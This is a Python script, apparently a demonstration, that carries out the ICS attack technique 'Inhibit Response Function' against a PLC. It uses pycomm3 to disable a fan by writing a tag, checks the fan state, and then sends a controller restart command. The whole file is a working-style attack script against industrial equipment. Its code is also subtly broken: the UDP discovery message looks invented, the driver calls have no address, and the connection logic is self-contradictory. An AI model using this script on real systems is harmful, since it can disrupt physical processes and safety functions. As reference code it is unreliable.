import pycomm3
import time
import socket

# MITRE ATT&CK Technique T0843: Inhibit Response Function
# Sub-technique: Device Restart/Shutdown

# Configurable Parameters (Adjust these to your environment)
PLC_CONTROLLER_TAG = "_SYS.HMI.ControllerName"  # Tag to read controller name
TOG_OFF_TAG = "Tog_Off"  # Tag to disable the fan and green LED
RESTART_TAG = "_SYS.HMI.ResetController" # Tag to restart the PLC.  This is a Micro800 system tag
CHECK_STATUS_TAG = "Activate_FanA" # Tag to check if the fan is currently active

# Helper function to find PLC IP address using controller name
def find_plc_ip(controller_name):
    """
    Finds the IP address of a PLC given its controller name using UDP broadcast.

    Args:
        controller_name (str): The controller name to search for.

    Returns:
        str: The IP address of the PLC, or None if not found.
    """
    UDP_PORT = 2222
    MESSAGE = b"Who is the Logix CPU?"

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(5)  # Wait up to 5 seconds for a response

    sock.sendto(MESSAGE, ('<broadcast>', UDP_PORT))

    try:
        data, addr = sock.recvfrom(1024)
        response = data.decode('utf-8', errors='ignore')
        if controller_name in response:
            print(f"Found Controller: {controller_name} at IP address: {addr[0]}")
            return addr[0]
        else:
            print("Device found, but not the PLC we were looking for")
    except socket.timeout:
        print("No Logix CPU found on the network.")
        return None
    finally:
        sock.close()
# ---------------------------------------------
# Main Script Logic
# ---------------------------------------------

try:
    # Step 1: Find the PLC's IP address.
    plc_ip_address = None
    try:
        with pycomm3.LogixDriver() as driver: # This is a dummy call to check if it is an ethernet cable
            driver.open(None)
        print("It seems that the PLC is already connected using an ethernet cable. Finding PLC IP address is not necessary")
        plc_ip_address = input("Please specify the PLC's IP address: ") # Prompt the user to insert the PLC's IP address
    except:
        print("Finding PLC IP address")
        controller_name = None
        with pycomm3.LogixDriver() as driver:
            driver.open(None)
            try:
                controller_name = driver.read(PLC_CONTROLLER_TAG).value
            except Exception as e:
                print(f"Error reading PLC controller name: {e}")
        if controller_name:
            plc_ip_address = find_plc_ip(controller_name)
        else:
            print("Could not get controller name from PLC. Aborting.")
            exit()

    if not plc_ip_address:
        print("Could not find PLC IP address.  Please ensure PLC is on the network and responding to broadcasts.")
        exit()

    # Step 2: Connect to the PLC.
    with pycomm3.LogixDriver(plc_ip_address) as driver:
        driver.open()
        print(f"Connected to PLC at {plc_ip_address}")

        # Step 3: Check the current status of the fan (optional, for demonstration purposes)
        current_fan_state = driver.read(CHECK_STATUS_TAG).value
        print(f"Initial Fan Status: {current_fan_state}")

        # Step 4: Inhibit Response Function - Disable Fan Operation by setting Tog_Off to TRUE
        print("Disabling Fan operation...")
        driver.write(TOG_OFF_TAG, True)
        time.sleep(2)  # Give the PLC time to process

        # Step 5: Verify the fan is off
        new_fan_state = driver.read(CHECK_STATUS_TAG).value
        print(f"Fan Status after inhibiting: {new_fan_state}")
        if new_fan_state:
            print("Failed to Inhibit Fan. Exiting...")
            exit()

        # Step 6: Restart/Shutdown the PLC
        print("Restarting PLC...")
        driver.write(RESTART_TAG, True) # Set Restart tag to true

        print("PLC Restart command sent.  PLC will now restart.  Script exiting.")

except Exception as e:
    print(f"An error occurred: {e}")